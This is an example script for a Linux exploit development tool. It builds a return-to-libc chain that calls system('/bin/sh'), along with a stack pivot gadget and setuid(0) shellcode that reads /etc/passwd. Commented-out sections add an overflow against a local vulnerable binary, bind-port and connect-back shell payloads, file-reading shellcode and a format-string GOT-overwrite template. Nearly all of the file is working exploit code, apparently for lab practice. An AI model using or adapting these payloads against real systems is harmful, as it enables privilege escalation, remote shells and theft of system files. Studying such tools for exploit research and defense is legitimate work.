###############################################################
#       LEDT - Linux Exploit Development Tool
#
#       Copyright (C) 2014 random <random@pku.edu.cn>
#
###############################################################
try:
	import sys 
	sys.path.append("..") 

	from lib.ledt import *
	from lib.utils import *
	from lib.shellcode.shellcode_loader import *
except Exception,e:
	print e


ledt = LEDT()


################
#
# return-to-lib
#
################ return_to_system #######################
libc_base 	= 0xb7e5d000
system_off 	= ledt.libfunc_offset('/lib/i386-linux-gnu/i686/cmov/libc-2.13.so', 'system')
exit_off 	= ledt.libfunc_offset('/lib/i386-linux-gnu/i686/cmov/libc-2.13.so', 'exit')
bash_off 	= ledt.str_search('/lib/i386-linux-gnu/i686/cmov/libc-2.13.so', '/bin/sh')[0][0]

system_off 	= L32( libc_base + system_off ) 	or L32hexstr( libc_base + system_off )

exit_off 	= L32( libc_base + exit_off ) 	or L32hexstr( libc_base + exit_off )

bash_off 	= L32( libc_base + bash_off ) 	or L32hexstr( libc_base + bash_off )

return_to_system = system_off + exit_off + bash_off



out = ledt.assemble("lea esp,[edx+0x14];ret")
line_output( to_hexstr(out) )


line_output( to_hexstr(return_to_system) )




'''

rop = return_to_system
overwrite_off = 0x20

cmd = ['../vunls/stack_exploit','a'*overwrite_off + rop]
execute_local(cmd)

'''


ShellcodeLoader.init_regs()
ShellcodeLoader.setuid(0)
execve_shellcode = ShellcodeLoader.execve(binpath='/bin/sh', parameters=['-c','cat /etc/passwd'])
print  out_format('c',execve_shellcode)


'''
################################
#exploit remote tcp application
################################
ledt.send('127.0.0.1',4444,data)
ledt.read()
ledt.close()
'''


'''
################
#
#	Shellcode
#
################ execve(/bin/sh) ShellCode #######################
ShellcodeLoader.init_regs()
ShellcodeLoader.setuid(0)
execve_shellcode = ShellcodeLoader.execve(binpath='/bin/sh', parameters=[])

#execve_shellcode = ShellcodeLoader.format_shellcode('hex')
#line_output(execve_shellcode)


################ execve(/bin/sh -c cat /etc/passwd) ShellCode #######################
ShellcodeLoader.init_regs()
ShellcodeLoader.setuid(0)
execve_shellcode = ShellcodeLoader.execve(binpath='/bin/sh', parameters=['-c','cat /etc/passwd'])
#execve_shellcode = ShellcodeLoader.format_shellcode('hex')
#ine_output(execve_shellcode)


################ execve(/bin/ls -al /etc/passwd) ShellCode #######################
ShellcodeLoader.init_regs()
ShellcodeLoader.setuid(0)
execve_shellcode = ShellcodeLoader.execve(binpath='/bin/ls', parameters=['-al','/etc/passwd'])
#execve_shellcode = ShellcodeLoader.format_shellcode('hex')
#line_output(execve_shellcode)


################ bind_port ShellCode #######################
ShellcodeLoader.clear()
ShellcodeLoader.setuid(0)
payload = ShellcodeLoader.execve(binpath='/bin/sh', parameters=['-c','cat /etc/passwd'])

ShellcodeLoader.init_regs()
bind_shellcode = ShellcodeLoader.bind_port('127.0.0.1', 4444, payload)
#bind_shellcode = ShellcodeLoader.format_shellcode('hex')
#line_output(bind_shellcode)


################ connect_back ShellCode #######################
ShellcodeLoader.clear()
ShellcodeLoader.setuid(0)
payload = ShellcodeLoader.execve(binpath='/bin/sh', parameters=['-c','cat /etc/passwd'])

ShellcodeLoader.init_regs()
connect_shellcode = ShellcodeLoader.connect_back('127.0.0.1', 4444, payload)
#connect_shellcode = ShellcodeLoader.format_shellcode('hex')
#line_output(connect_shellcode)


################ readfile ShellCode #######################
ShellcodeLoader.init_regs()
ShellcodeLoader.setuid(0)
readfile_shellcode = ShellcodeLoader.readfile(filepath='/etc/passwd', r_size=0x101, fd = 1)
#readfile_shellcode = ShellcodeLoader.format_shellcode('hex')
#line_output(readfile_shellcode)


################ Format  ShellCode #######################

exit_got = 0x804a044				# "exit()" address in got
target_eip = 0x0804888c				# func "yoyo()" in printf
off = 80/4 - 1 
ShellcodeLoader.clear()
format_shellcode = ShellcodeLoader.format_exploit_template(overwrite_ip=exit_got , offset=off , shellcodeAddr=target_eip)
#line_output(format_shellcode)
'''
